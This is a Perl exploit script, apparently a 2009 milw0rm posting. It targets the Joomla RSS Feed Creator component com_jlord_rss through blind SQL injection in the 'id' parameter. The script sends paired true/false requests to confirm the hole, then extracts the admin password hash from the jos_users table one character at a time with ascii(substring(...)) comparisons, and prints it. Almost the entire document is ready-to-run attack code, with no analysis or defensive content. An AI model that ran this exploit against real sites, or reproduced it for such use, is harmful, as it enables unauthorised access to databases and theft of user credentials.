#!/usr/bin/perl -w
use LWP::UserAgent;
use Benchmark;
my $t1 = new Benchmark;


print "\t\t------------------------------------------------------------\n\n";
print "\t\t                      |  Chip d3 Bi0s |                     \n\n";
print "\t\t RSS Feed Creator by foobla                                 \n\n";
print "\t\t Joomla Component com_jlord_rs (id) BSQL                    \n\n";
print "\t\t-------------------------------------------------------------\n\n";


print "http://localhost/Path       : ";chomp(my $target=<STDIN>);
print " [-] Introduce id           : ";chomp($z=<STDIN>);
print " [-] Introduce coincidencia : ";chomp($w=<STDIN>);


$column_name="concat(password)";
$table_name="jos_users";


$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');

print "----------------Inyectando----------------\n";

#es Vulnerable?
  $host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+1=1";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  if ($content =~ /$regexp/) {

$host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+1=2";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  if ($content =~ /$regexp/) {print " [-] Exploit Fallo :(\n";}

else

{print " [-] Vulnerable :)\n";

for ($x=1;$x<=32;$x++) 
	{

  $host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))>57";
  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;
  print " [!] ";if($x <= 9 ) {print "0$x";}else{print $x;}#para alininear 0..9 con los 10-32

  if ($content =~ /$regexp/)
  {
  
          for ($c=97;$c<=102;$c++) 

{
 $host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $w;


 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=102;}
 }


  }
else
{

for ($c=48;$c<=57;$c++) 

{
 $host = $target . "/index.php?option=com_jlord_rss&task=feed&id=".$z."+and+ascii(substring((SELECT+".$column_name."+from+".$table_name."+limit+0,1),".$x.",1))=".$c."";
 my $res = $b->request(HTTP::Request->new(GET=>$host));
 my $content = $res->content;
 my $regexp = $w;

 if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print "-Caracter: $char\n"; $c=57;}
 }


}

	}
print " [+] Password   :"." ".join('', @caracter) . "\n";
my $t2 = new Benchmark;
my $tt = timediff($t2, $t1);
print "El script tomo:",timestr($tt),"\n";

}
}

else

{print " [-] Exploit Fallo :(\n";}

# milw0rm.com [2009-09-16]
